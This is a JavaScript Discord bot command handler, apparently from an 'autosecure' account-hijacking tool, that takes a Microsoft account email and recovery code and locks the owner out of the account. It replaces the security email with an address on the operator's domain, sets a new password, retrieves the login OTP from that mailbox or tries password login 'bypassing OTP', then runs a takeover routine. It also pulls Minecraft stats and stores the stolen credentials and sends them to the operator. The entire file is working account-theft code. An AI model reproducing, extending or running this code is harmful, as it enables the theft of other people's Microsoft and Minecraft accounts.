const { ButtonBuilder, ButtonStyle, ActionRowBuilder } = require('discord.js');
const recoveryCodeSecure = require('../../utils/secure/recoveryCodeSecure.js');
const { domains } = require("../../../config.json");
const generate = require('../../utils/generate');
const { getEmailDescription } = require('../../utils/utils/getEmailDescription.js');
const { extractCode } = require("../../../autosecure/utils/utils/extractCode.js");
const listAccount = require("../../../autosecure/utils/accounts/listAccount.js");
const login = require('../../utils/secure/login.js');
const { queryParams } = require("../../../db/database.js");
const secure = require('../../utils/secure/recodesecure.js');
const generateuid = require('../../utils/generateuid');
const insertaccount = require("../../../db/insertaccount");
const getStats = require('../../utils/hypixelapi/getStats.js');
const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
const mcregex = require("../../../autosecure/utils/utils/mcregex.js");
const otp = require('../../../autosecure/utils/utils/otp.js');
const { failedembed } = require('../../../autosecure/utils/embeds/embedhandler.js');
const sendotp = require('../../../autosecure/utils/secure/sendotp.js');

module.exports = {
    name: "recsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            const processStartTime = Date.now();
            const email = interaction.components[0].components[0].value;
            const recoveryCode = interaction.components[1].components[0].value;
            const mcign = interaction.components[2].components[0].value || null;

            // Validate inputs
            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                return interaction.reply({
                    content: "Please enter a valid email address!",
                    ephemeral: true
                });
            }
            if (!recoveryCode || !/^[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}$/.test(recoveryCode)) {
                return interaction.reply({
                    content: "Please enter a valid 25-character recovery code (format: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX)!",
                    ephemeral: true
                });
            }
            if (mcign && !mcregex(mcign)) {
                return interaction.reply({
                    content: "Please enter a valid Minecraft username!",
                    ephemeral: true
                });
            }

            // Fetch settings
            let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
            if (settings.length === 0) {
                return interaction.reply({
                    content: `Couldn't get your settings!`,
                    ephemeral: true
                });
            }
            settings = settings[0];
            console.log('Settings:', settings);

            await interaction.deferReply({ ephemeral: true });

            // Generate security email and password
            const secEmail = `${generate(16)}@${domains[0]}`;
            const password = generate(16);
            if (!secEmail.includes('@') || secEmail.length > 254) {
                return interaction.editReply({
                    content: "Generated security email is invalid!",
                    ephemeral: true
                });
            }
            if (password.length < 8) {
                return interaction.editReply({
                    content: "Generated password is too short!",
                    ephemeral: true
                });
            }

            // Call recoveryCodeSecure
            const data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);
            console.log('recoveryCodeSecure response:', JSON.stringify(data, null, 2));

            // Handle responses
            if (data === null) {
                return interaction.editReply({ content: `Invalid email address`, ephemeral: true });
            }
            if (data === 'tfa') {
                return interaction.editReply({ content: `Cannot secure when 2FA is enabled.`, ephemeral: true });
            }
            if (data === 'invalid') {
                return interaction.editReply({ content: `Invalid Recovery Code!`, ephemeral: true });
            }
            if (data === 'same') {
                return interaction.editReply({
                    content: `You entered the same password or security email for securing or Microsoft is giving invalid responses!`,
                    ephemeral: true
                });
            }
            if (data?.error) {
                return interaction.editReply({
                    content: `An unexpected error occurred: ${data.error}`,
                    ephemeral: true
                });
            }
            if (!data?.email2 || !data?.recoveryCode || !data?.secEmail || !data?.password) {
                console.error('Invalid data structure from recoveryCodeSecure:', JSON.stringify(data, null, 2));
                return interaction.editReply({
                    content: `An unexpected error occurred: Invalid data structure from securing process`,
                    ephemeral: true
                });
            }

            // Proceed with securing process
            const time = Date.now();
            const d = data.email2;

            const sec = await otp(d);
            console.log('OTP response:', JSON.stringify(sec, null, 2)); // Added logging
            const otpSent = sec.sent;
            const secId = sec.sec;

            if (!secId) {
                if (data?.error?.includes("temporarily unavailable")) {
                    return interaction.editReply({
                        content: `An unexpected error occurred: OTP process failed due to Microsoft service maintenance. Please try again later.`,
                        ephemeral: true
                    });
                }
                console.error('No secId returned from otp:', sec);
                return interaction.editReply({
                    content: `An unexpected error occurred: OTP process failed. Check email configuration or service status.`,
                    ephemeral: true
                });
            }

            console.log(`⏳ Waiting for OTP email to ${data.secEmail}...`);
            console.log(`📧 OTP sent status: ${otpSent ? 'Yes' : 'No'}`);
            
            let emailDescription = otpSent ? await getEmailDescription(time, data.secEmail) : null;
            console.log(`📨 Email description received: ${emailDescription ? 'Yes' : 'No'}`);
            
            if (emailDescription) {
                console.log(`📝 Email content preview: ${emailDescription.substring(0, 300)}...`);
            }
            
            // If no email found, try again with a longer timeout
            if (!emailDescription && otpSent) {
                console.log(`🔄 No email found, trying again with longer timeout...`);
                await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 more seconds
                emailDescription = await getEmailDescription(time, data.secEmail);
                console.log(`🔄 Second attempt - Email description received: ${emailDescription ? 'Yes' : 'No'}`);
                
                if (emailDescription) {
                    console.log(`📝 Second attempt email content preview: ${emailDescription.substring(0, 300)}...`);
                }
            }
            
            const code = emailDescription ? extractCode(emailDescription) : null;
            console.log(`🔑 Code extracted: ${code ? `Yes (${code})` : 'No'}`);
            
            if (code) {
                console.log(`✅ Successfully extracted OTP code: ${code}`);
            } else if (emailDescription) {
                console.log(`❌ Failed to extract code from email content`);
                console.log(`📝 Full email content for debugging: ${emailDescription}`);
            } else {
                console.log(`❌ No email content received to extract code from`);
            }

            if (secId) {
                if (otpSent && emailDescription && code) {
                    console.log(`Attempting login with OTP code: ${code}`);
                    const host = await login({ email: data.email2, id: secId, code: code }, null);
                    if (!host) {
                        let recsecId = generate(32);
                        await queryParams(
                            `INSERT INTO actions(id, action) VALUES(?, ?)`,
                            [`${recsecId}`, `recsecure|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
                        );

                        const msg = {
                            embeds: [
                                {
                                    title: `Couldn't full-secure: OTP Disabled before login!`,
                                    fields: [
                                        { name: "Email", value: "```\n" + data.email2 + "\n```", inline: true },
                                        { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: true },
                                        { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                                        { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false },
                                    ],
                                    color: 0xb2c7e0
                                }
                            ],
                            components: [
                                new ActionRowBuilder().addComponents(
                                    new ButtonBuilder()
                                        .setCustomId(`copyrec|${recsecId}`)
                                        .setLabel('Copy Text')
                                        .setStyle(ButtonStyle.Secondary)
                                )
                            ],
                            ephemeral: true
                        };

                        await interaction.user.send(msg);
                        return interaction.editReply(msg);
                    }

                    const processEndTime = Date.now();
                    const rectaken = (processEndTime - processStartTime) / 1000;
                    const uid = await generateuid();

                    const embed = {
                        title: `This account is being automatically secured.\n\`\`\`\n${data.email2} | ${data.recoveryCode || "Invalid Recovery Code"}\n\`\`\``,
                        color: 0x808080
                    };

                    const components = [
                        new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                                .setCustomId(`status|${uid}`)
                                .setLabel('⏳ Status')
                                .setStyle(ButtonStyle.Primary)
                        )
                    ];

                    const statusMsg = {
                        embeds: [embed],
                        components: components,
                        ephemeral: true
                    };

                    await interaction.editReply(statusMsg);
                    await interaction.user.send(statusMsg);

                    const acc = await secure(host, settings, uid, mcign);
                    insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);

                    const failedmsg = await failedembed(acc, uid);
                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }

                    let timetaken = parseFloat(acc.timeTaken) + rectaken;
                    acc.timeTaken = Math.round(timetaken);

                    const msg = await listAccount(acc, uid, client, interaction);
                    const statsEmb = await statsembed(client, acc, interaction);

                    await interaction.followUp({
                        ...msg,
                        ephemeral: true
                    });
                    await interaction.user.send(statsEmb);
                    await interaction.user.send(msg);

                    return;
                } else {
                    // Try to login with password directly (bypass OTP)
                    console.log(`Attempting login with password directly (bypassing OTP)...`);
                    const obj = {
                        email: data.email2,
                        password: data.password,
                        secId: secId,
                        secEmail: data.secEmail
                    };

                    const host = await login(obj, null);
                    if (host) {
                        const processEndTime = Date.now();
                        const rectaken = (processEndTime - processStartTime) / 1000;
                        const uid = await generateuid();

                        const embed = {
                            title: 'This account is being automatically secured.',
                            color: 0x808080
                        };

                        const components = [
                            new ActionRowBuilder().addComponents(
                                new ButtonBuilder()
                                    .setCustomId(`status|${uid}`)
                                    .setLabel('⏳ Status')
                                    .setStyle(ButtonStyle.Primary)
                            )
                        ];

                        const statusMsg = {
                            embeds: [embed],
                            components: components,
                            ephemeral: true
                        };

                        await interaction.editReply(statusMsg);
                        await interaction.user.send(statusMsg);

                        const acc = await secure(host, settings, uid, mcign);
                        insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);

                        const failedmsg = await failedembed(acc, uid);
                        if (failedmsg.failed) {
                            await interaction.followUp(failedmsg.failedmsg);
                            await interaction.user.send(failedmsg.failedmsg);
                            return;
                        }

                        let timetaken = parseFloat(acc.timeTaken) + rectaken;
                        acc.timeTaken = Math.round(timetaken);

                        const msg = await listAccount(acc, uid, client, interaction);
                        const statsEmb = await statsembed(client, acc, interaction);

                        await interaction.followUp({
                            ...msg,
                            ephemeral: true
                        });
                        await interaction.user.send(statsEmb);
                        await interaction.user.send(msg);

                        return;
                    }

                    let reason;
                    if (!otpSent) {
                        reason = "Couldn't send OTP code!";
                    } else if (!emailDescription) {
                        reason = "Microsoft sent no code email!";
                    } else {
                        reason = "Couldn't extract code from email!";
                    }

                    let recsecId = generate(32);
                    await queryParams(
                        `INSERT INTO actions(id, action) VALUES(?, ?)`,
                        [`${recsecId}`, `copyrec|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
                    );

                    const msg = {
                        embeds: [
                            {
                                title: `Couldn't full-secure: ${reason}`,
                                fields: [
                                    { name: "Email", value: "```\n" + data.email2 + "\n```", inline: true },
                                    { name: "Security Email", value: "```\n" + data.secEmail + "\n```", inline: true },
                                    { name: "Password", value: "```\n" + data.password + "\n```", inline: false },
                                    { name: "Recovery Code", value: "```\n" + data.recoveryCode + "\n```", inline: false }
                                ],
                                color: 0xb2c7e0
                            }
                        ],
                        components: [
                            new ActionRowBuilder().addComponents(
                                new ButtonBuilder()
                                    .setCustomId(`copyrec|${recsecId}`)
                                    .setLabel('Copy Text')
                                    .setStyle(ButtonStyle.Secondary)
                            )
                        ],
                        ephemeral: true
                    };

                    await interaction.user.send(msg);
                    return interaction.editReply(msg);
                }
            }
        } catch (error) {
            console.error('Error in recsecure callback:', error.message, error.stack);
            return interaction.editReply({
                content: `An unexpected error occurred: ${error.message}`,
                ephemeral: true
            });
        }
    }
};